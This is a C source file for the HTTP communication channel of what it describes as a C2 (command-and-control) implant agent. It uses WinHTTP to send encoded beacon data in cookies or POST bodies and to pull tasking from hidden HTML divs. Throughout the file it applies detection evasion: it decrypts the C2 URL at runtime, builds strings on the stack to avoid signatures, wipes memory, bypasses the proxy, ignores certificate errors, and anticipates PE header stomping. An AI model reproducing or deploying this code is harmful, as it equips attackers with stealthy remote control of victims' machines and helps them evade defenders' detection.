/*
 * channel.c — HTTP channel via WinHTTP.
 * Sends C2 data as base64url in a cookie (per malleable profile).
 * Receives response as base64 in an HTML wrapper.
 *
 * NOTE: All protocol string literals are built on the stack at runtime
 * (char-by-char assignment) to avoid plaintext signatures in .rdata.
 * Each is wiped with SecureZeroMemory after use.
 */
#include "agent.h"

static HINTERNET g_hSession = NULL;

/* -- Hard timeout watchdog --
 * WinHttpSetTimeouts is unreliable in some configurations (especially
 * after PE header stomping / evasion patches).  This watchdog thread
 * guarantees WinHttpSendRequest returns within HTTP_HARD_TIMEOUT_MS
 * by force-closing the request handle.
 */
typedef struct {
    HINTERNET hRequest;
    HANDLE    hDone;          /* signalled when main thread is done */
    volatile LONG cancelled;  /* set to 1 if watchdog fired */
} HttpWatchdog;

#define HTTP_HARD_TIMEOUT_MS 30000

static DWORD WINAPI _http_watchdog(LPVOID param) {
    HttpWatchdog *wd = (HttpWatchdog *)param;
    DWORD result = WaitForSingleObject(wd->hDone, HTTP_HARD_TIMEOUT_MS);
    if (result == WAIT_TIMEOUT) {
        InterlockedExchange(&wd->cancelled, 1);
        DBG("[http] WATCHDOG: %us hard timeout fired -- force-cancelling request",
            HTTP_HARD_TIMEOUT_MS / 1000);
        WinHttpCloseHandle(wd->hRequest);
    }
    return 0;
}

BOOL http_init(void) {
    g_hSession = WinHttpOpen(
        L"" /* User-Agent set per-request */,
        WINHTTP_ACCESS_TYPE_NO_PROXY,   /* Direct connection — bypass system proxy */
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    if (!g_hSession) return FALSE;

    /*
     * Force TLS 1.2 only.  WinHTTP + Schannel TLS 1.3 has known handshake
     * interop issues with OpenSSL servers (renegotiation, ALPN mismatch,
     * post-handshake auth).  TLS 1.2 is universally supported.
     *
     * MUST be set on the session handle BEFORE any WinHttpConnect calls.
     */
    DWORD protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2;
    if (!WinHttpSetOption(g_hSession, WINHTTP_OPTION_SECURE_PROTOCOLS,
                          &protocols, sizeof(protocols))) {
        DBG("[http] WARNING: WinHttpSetOption(SECURE_PROTOCOLS) failed err=%u",
            GetLastError());
    } else {
        DBG("[http] forced TLS 1.2 only (protocols=0x%08X)", protocols);
    }

    /*
     * Disable HTTP/2 ALPN negotiation.  When WinHTTP sends h2 in the ALPN
     * extension but the server doesn't support it properly, the TLS
     * handshake can stall.  Force HTTP/1.1 only.
     */
    DWORD http_proto = 0;  /* 0 = HTTP/1.1 only, no HTTP/2 */
    WinHttpSetOption(g_hSession, WINHTTP_OPTION_ENABLE_HTTP_PROTOCOL,
                     &http_proto, sizeof(http_proto));
    DBG("[http] HTTP/2 ALPN disabled (HTTP/1.1 only)");

    /*
     * Set explicit timeouts.  Now that PE-stomp preserves PE structure,
     * WinHTTP can create internal threads normally and these timeouts
     * cover the full connection lifecycle including TLS handshake.
     */
    WinHttpSetTimeouts(g_hSession,
        5000,   /* DNS resolve: 5 seconds  */
        10000,  /* Connect:     10 seconds */
        15000,  /* Send:        15 seconds */
        15000   /* Receive:     15 seconds */
    );

    return TRUE;
}

void http_cleanup(void) {
    if (g_hSession) {
        WinHttpCloseHandle(g_hSession);
        g_hSession = NULL;
    }
}

/* Convert narrow string to wide string (caller frees) */
static wchar_t *to_wide(const char *s) {
    int len = MultiByteToWideChar(CP_UTF8, 0, s, -1, NULL, 0);
    wchar_t *w = (wchar_t *)malloc(len * sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, s, -1, w, len);
    return w;
}

/* ─── Profile transforms ─── */

char *profile_encode_request(const unsigned char *packet, DWORD packet_len,
                             DWORD *cookie_len) {
    /* Base64URL encode the packet for cookie embedding */
    return base64url_encode(packet, packet_len, cookie_len);
}

unsigned char *profile_decode_response(const char *body, DWORD body_len,
                                       DWORD *out_len) {
    /*
     * Response format (from default profile):
     *   <html><body><div style="display:none">\n
     *   BASE64_DATA\n
     *   </div></body></html>\n
     *
     * Find the base64 data between the wrappers.
     */

    /* Stack-built marker: display:none"> — no .rdata footprint */
    char _m1[15];
    _m1[0]='d'; _m1[1]='i'; _m1[2]='s'; _m1[3]='p'; _m1[4]='l';
    _m1[5]='a'; _m1[6]='y'; _m1[7]=':'; _m1[8]='n'; _m1[9]='o';
    _m1[10]='n'; _m1[11]='e'; _m1[12]='"'; _m1[13]='>'; _m1[14]=0;

    const char *start = strstr(body, _m1);
    if (!start) {
        /* Fallback: try to find base64 directly */
        start = body;
    } else {
        start += sizeof(_m1) - 1;
        /* Skip whitespace/newlines */
        while (*start == '\n' || *start == '\r' || *start == ' ') start++;
    }
    SecureZeroMemory(_m1, sizeof(_m1));

    /* Stack-built marker: </div> */
    char _m2[7];
    _m2[0]='<'; _m2[1]='/'; _m2[2]='d'; _m2[3]='i'; _m2[4]='v';
    _m2[5]='>'; _m2[6]=0;

    const char *end = strstr(start, _m2);
    SecureZeroMemory(_m2, sizeof(_m2));
    if (!end) end = body + body_len;

    /* Trim trailing whitespace */
    while (end > start && (end[-1] == '\n' || end[-1] == '\r' || end[-1] == ' '))
        end--;

    DWORD b64_len = (DWORD)(end - start);
    if (b64_len == 0) {
        *out_len = 0;
        return NULL;
    }

    return base64_decode(start, b64_len, out_len);
}

/* ─── HTTP send/receive ─── */

BOOL http_send_recv(const unsigned char *packet, DWORD packet_len,
                    unsigned char **response, DWORD *response_len) {
    *response = NULL;
    *response_len = 0;

    if (!g_hSession) return FALSE;

    /* Decrypt C2 URL at runtime (never stored as plaintext in binary) */
    char c2_url_dec[512];
    DECRYPT_CONFIG(c2_url_dec, C2_URL);
    wchar_t *wUrl = to_wide(c2_url_dec);
    SecureZeroMemory(c2_url_dec, sizeof(c2_url_dec));

    URL_COMPONENTS urlComp;
    memset(&urlComp, 0, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.dwSchemeLength = (DWORD)-1;
    urlComp.dwHostNameLength = (DWORD)-1;
    urlComp.dwUrlPathLength = (DWORD)-1;

    if (!WinHttpCrackUrl(wUrl, 0, 0, &urlComp)) {
        DBG("[http] WinHttpCrackUrl FAILED (err=%u)", GetLastError());
        free(wUrl);
        return FALSE;
    }

    /* Extract hostname */
    wchar_t hostname[256] = {0};
    wcsncpy(hostname, urlComp.lpszHostName, min(urlComp.dwHostNameLength, 255));

    /* Extract path */
    wchar_t path[512] = {0};
    if (urlComp.lpszUrlPath && urlComp.dwUrlPathLength > 0)
        wcsncpy(path, urlComp.lpszUrlPath, min(urlComp.dwUrlPathLength, 511));
    else
        wcscpy(path, L"/");

    BOOL isHttps = (urlComp.nScheme == INTERNET_SCHEME_HTTPS);
    INTERNET_PORT port = urlComp.nPort;
    if (port == 0) port = isHttps ? 443 : 80;

    /* Connect */
    DBG("[http] connecting to %S:%u (https=%d)", hostname, port, isHttps);
    HINTERNET hConnect = WinHttpConnect(g_hSession, hostname, port, 0);
    if (!hConnect) {
        DWORD err = GetLastError();
        DBG("[http] WinHttpConnect FAILED (err=%u / 0x%08X)", err, err);
        free(wUrl);
        return FALSE;
    }

    /* Encode packet as base64url */
    DWORD b64_len;
    char *b64_val = profile_encode_request(packet, packet_len, &b64_len);
    if (!b64_val) {
        WinHttpCloseHandle(hConnect);
        free(wUrl);
        return FALSE;
    }

    /*
     * Decide transport: small payloads go in Cookie header (GET),
     * large payloads go in POST body to avoid header size limits.
     * Threshold: 8000 bytes of base64 (safe for most HTTP stacks).
     */
    BOOL use_post = (b64_len > 8000);

    /* Stack-built HTTP methods — no L"POST"/L"GET" in .rdata */
    wchar_t _wPost[5];
    _wPost[0]=L'P'; _wPost[1]=L'O'; _wPost[2]=L'S'; _wPost[3]=L'T'; _wPost[4]=0;
    wchar_t _wGet[4];
    _wGet[0]=L'G'; _wGet[1]=L'E'; _wGet[2]=L'T'; _wGet[3]=0;
    const wchar_t *method = use_post ? _wPost : _wGet;

    DBG("[http] payload b64_len=%u, using %s", b64_len, use_post ? "POST" : "GET+cookie");

    /* Open request */
    DBG("[http] opening request...");
    DWORD flags = isHttps ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect, method, path, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);

    /* Method strings consumed — wipe from stack */
    SecureZeroMemory(_wPost, sizeof(_wPost));
    SecureZeroMemory(_wGet, sizeof(_wGet));

    if (!hRequest) {
        DWORD err = GetLastError();
        DBG("[http] WinHttpOpenRequest FAILED (err=%u / 0x%08X)", err, err);
        WinHttpCloseHandle(hConnect);
        free(wUrl);
        free(b64_val);
        return FALSE;
    }
    DBG("[http] request handle opened OK");

    /* Per-request timeouts (belt-and-suspenders with session-level).
     * Some Windows builds ignore session-level timeouts after PE header
     * modifications -- setting them on the request handle too. */
    {
        DWORD conn_to = 10000, send_to = 15000, recv_to = 15000;
        BOOL t1 = WinHttpSetOption(hRequest, WINHTTP_OPTION_CONNECT_TIMEOUT,
                                    &conn_to, sizeof(conn_to));
        BOOL t2 = WinHttpSetOption(hRequest, WINHTTP_OPTION_SEND_TIMEOUT,
                                    &send_to, sizeof(send_to));
        BOOL t3 = WinHttpSetOption(hRequest, WINHTTP_OPTION_RECEIVE_TIMEOUT,
                                    &recv_to, sizeof(recv_to));
        DBG("[http] per-request timeouts: conn=%s send=%s recv=%s",
            t1 ? "OK" : "FAIL", t2 ? "OK" : "FAIL", t3 ? "OK" : "FAIL");
    }

    /* Accept self-signed certs (C2 server) */
    if (isHttps) {
        DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                         SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                         SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                         SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS,
                         &secFlags, sizeof(secFlags));
        DBG("[http] TLS sec flags set (ignore cert errors)");
    }

    /* Decrypt and set User-Agent header */
    char ua_dec[512];
    DECRYPT_CONFIG(ua_dec, USER_AGENT);
    char ua_header[768];
    /* Stack-built format: "User-Agent: %s" */
    char _uafmt[15];
    _uafmt[0]='U'; _uafmt[1]='s'; _uafmt[2]='e'; _uafmt[3]='r';
    _uafmt[4]='-'; _uafmt[5]='A'; _uafmt[6]='g'; _uafmt[7]='e';
    _uafmt[8]='n'; _uafmt[9]='t'; _uafmt[10]=':'; _uafmt[11]=' ';
    _uafmt[12]='%'; _uafmt[13]='s'; _uafmt[14]=0;
    snprintf(ua_header, sizeof(ua_header), _uafmt, ua_dec);
    SecureZeroMemory(_uafmt, sizeof(_uafmt));
    SecureZeroMemory(ua_dec, sizeof(ua_dec));
    wchar_t *wUA = to_wide(ua_header);
    SecureZeroMemory(ua_header, sizeof(ua_header));
    WinHttpAddRequestHeaders(hRequest, wUA, (DWORD)-1,
                             WINHTTP_ADDREQ_FLAG_REPLACE | WINHTTP_ADDREQ_FLAG_ADD);
    free(wUA);
    DBG("[http] headers set, about to send...");

    /* Start hard-timeout watchdog -- guarantees WinHttpSendRequest returns
     * even if WinHTTP's own timeouts are broken (e.g. after PE stomp). */
    HttpWatchdog wdCtx;
    HANDLE hWatchdog = NULL;
    wdCtx.hRequest = hRequest;
    wdCtx.cancelled = 0;
    wdCtx.hDone = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (wdCtx.hDone) {
        hWatchdog = CreateThread(NULL, 0, _http_watchdog, &wdCtx, 0, NULL);
        if (!hWatchdog) {
            DBG("[http] WARNING: watchdog thread creation failed (err=%u)", GetLastError());
            CloseHandle(wdCtx.hDone);
            wdCtx.hDone = NULL;
        } else {
            DBG("[http] watchdog armed (%us hard timeout)", HTTP_HARD_TIMEOUT_MS / 1000);
        }
    }

    BOOL ok;
    if (use_post) {
        /* Large payload: send as POST body with Content-Type */
        /* Stack-built header: L"Content-Type: application/octet-stream" */
        wchar_t _ct[39];
        _ct[0]=L'C'; _ct[1]=L'o'; _ct[2]=L'n'; _ct[3]=L't'; _ct[4]=L'e';
        _ct[5]=L'n'; _ct[6]=L't'; _ct[7]=L'-'; _ct[8]=L'T'; _ct[9]=L'y';
        _ct[10]=L'p'; _ct[11]=L'e'; _ct[12]=L':'; _ct[13]=L' ';
        _ct[14]=L'a'; _ct[15]=L'p'; _ct[16]=L'p'; _ct[17]=L'l'; _ct[18]=L'i';
        _ct[19]=L'c'; _ct[20]=L'a'; _ct[21]=L't'; _ct[22]=L'i'; _ct[23]=L'o';
        _ct[24]=L'n'; _ct[25]=L'/'; _ct[26]=L'o'; _ct[27]=L'c'; _ct[28]=L't';
        _ct[29]=L'e'; _ct[30]=L't'; _ct[31]=L'-'; _ct[32]=L's'; _ct[33]=L't';
        _ct[34]=L'r'; _ct[35]=L'e'; _ct[36]=L'a'; _ct[37]=L'm'; _ct[38]=0;
        WinHttpAddRequestHeaders(hRequest, _ct, (DWORD)-1,
            WINHTTP_ADDREQ_FLAG_ADD);
        SecureZeroMemory(_ct, sizeof(_ct));
        DBG("[http] calling WinHttpSendRequest (POST, %u bytes)...", b64_len);
        ok = WinHttpSendRequest(hRequest,
                WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                (LPVOID)b64_val, b64_len, b64_len, 0);
    } else {
        /* Small payload: embed in Cookie header (stealthier) */
        char ck_name_dec[64];
        DECRYPT_CONFIG(ck_name_dec, COOKIE_NAME);

        /* Stack-built prefix "Cookie: " and format "Cookie: %s=%s" */
        char _ckpfx[9];
        _ckpfx[0]='C'; _ckpfx[1]='o'; _ckpfx[2]='o'; _ckpfx[3]='k';
        _ckpfx[4]='i'; _ckpfx[5]='e'; _ckpfx[6]=':'; _ckpfx[7]=' '; _ckpfx[8]=0;
        char _ckfmt[14];
        _ckfmt[0]='C'; _ckfmt[1]='o'; _ckfmt[2]='o'; _ckfmt[3]='k';
        _ckfmt[4]='i'; _ckfmt[5]='e'; _ckfmt[6]=':'; _ckfmt[7]=' ';
        _ckfmt[8]='%'; _ckfmt[9]='s'; _ckfmt[10]='='; _ckfmt[11]='%';
        _ckfmt[12]='s'; _ckfmt[13]=0;

        /* Dynamic alloc for cookie header to avoid fixed buffer overflow */
        DWORD hdr_size = (DWORD)(strlen(_ckpfx) + strlen(ck_name_dec) + 1 + b64_len + 1);
        char *cookie_hdr = (char *)malloc(hdr_size);
        snprintf(cookie_hdr, hdr_size, _ckfmt, ck_name_dec, b64_val);
        SecureZeroMemory(_ckpfx, sizeof(_ckpfx));
        SecureZeroMemory(_ckfmt, sizeof(_ckfmt));
        SecureZeroMemory(ck_name_dec, sizeof(ck_name_dec));
        wchar_t *wCookie = to_wide(cookie_hdr);
        WinHttpAddRequestHeaders(hRequest, wCookie, (DWORD)-1,
                                 WINHTTP_ADDREQ_FLAG_ADD);
        free(wCookie);
        SecureZeroMemory(cookie_hdr, hdr_size);
        free(cookie_hdr);

        DBG("[http] calling WinHttpSendRequest (GET+cookie)...");
        ok = WinHttpSendRequest(hRequest,
                WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    }
    DBG("[http] WinHttpSendRequest returned ok=%d", ok);

    /* Stop watchdog -- signal completion, wait for thread to exit */
    if (wdCtx.hDone) SetEvent(wdCtx.hDone);
    if (hWatchdog) {
        WaitForSingleObject(hWatchdog, 3000);
        CloseHandle(hWatchdog);
        hWatchdog = NULL;
    }
    if (wdCtx.hDone) { CloseHandle(wdCtx.hDone); wdCtx.hDone = NULL; }

    if (wdCtx.cancelled) {
        DBG("[http] *** REQUEST CANCELLED BY WATCHDOG after %us ***", HTTP_HARD_TIMEOUT_MS / 1000);
        DBG("[http] WinHTTP timeouts did NOT fire -- this is a NETWORK issue");
        DBG("[http] Check: (1) C2 server running on target IP:port? "
            "(2) Firewall allowing outbound? (3) Correct subnet routing?");
        hRequest = NULL;  /* watchdog already closed the handle */
        free(b64_val);
        ok = FALSE;
        goto cleanup;
    }

    free(b64_val);

    if (!ok) {
        DWORD err = GetLastError();
        DBG("[http] WinHttpSendRequest FAILED (err=%u / 0x%08X)", err, err);
        /* Common errors:
         * 12002 = ERROR_WINHTTP_TIMEOUT (connect/send timeout)
         * 12007 = ERROR_WINHTTP_NAME_NOT_RESOLVED (DNS failed)
         * 12017 = ERROR_WINHTTP_OPERATION_CANCELLED (handle closed by watchdog)
         * 12029 = ERROR_WINHTTP_CANNOT_CONNECT (refused / unreachable)
         * 12175 = ERROR_WINHTTP_SECURE_FAILURE (TLS error)
         */
        goto cleanup;
    }

    /* Receive response */
    ok = WinHttpReceiveResponse(hRequest, NULL);
    if (!ok) {
        DWORD err = GetLastError();
        DBG("[http] WinHttpReceiveResponse FAILED (err=%u / 0x%08X)", err, err);
        goto cleanup;
    }

    /* Log HTTP status code */
    {
        DWORD statusCode = 0, statusSize = sizeof(statusCode);
        WinHttpQueryHeaders(hRequest,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusSize,
            WINHTTP_NO_HEADER_INDEX);
        DBG("[http] HTTP status = %u", statusCode);
    }

    /* Read response body */
    Buffer resp_buf;
    buf_init(&resp_buf, 4096);

    DWORD bytes_available, bytes_read;
    do {
        bytes_available = 0;
        WinHttpQueryDataAvailable(hRequest, &bytes_available);
        if (bytes_available == 0) break;

        unsigned char *chunk = (unsigned char *)malloc(bytes_available);
        if (WinHttpReadData(hRequest, chunk, bytes_available, &bytes_read)) {
            buf_append(&resp_buf, chunk, bytes_read);
        }
        free(chunk);
    } while (bytes_available > 0);

    DBG("[http] raw body len=%u", resp_buf.len);
    if (resp_buf.len > 0 && resp_buf.len < 512) {
        /* Log first chunk of body for debugging */
        char preview[256];
        DWORD plen = resp_buf.len < 255 ? resp_buf.len : 255;
        memcpy(preview, resp_buf.data, plen);
        preview[plen] = '\0';
        DBG("[http] body: %.200s", preview);
    }

    /* Decode response body (strip HTML wrapper, base64 decode) */
    if (resp_buf.len > 0) {
        /* Null-terminate for string operations */
        buf_append(&resp_buf, "\0", 1);
        *response = profile_decode_response((char *)resp_buf.data,
                                             resp_buf.len - 1, response_len);
    }

    /* NOTE: resp_buf NOT wiped here — profile_decode_response may return
     * a pointer into resp_buf.data (in-place base64 decode). The caller
     * owns *response and wipes it after use. Contents are ciphertext
     * wrapped in HTML anyway, not plaintext. */
    buf_free(&resp_buf);
    ok = (*response != NULL && *response_len > 0);
    DBG("[http] response decoded: %u bytes (ok=%d)", *response_len, ok);

cleanup:
    if (hRequest) WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    free(wUrl);
    return ok;
}
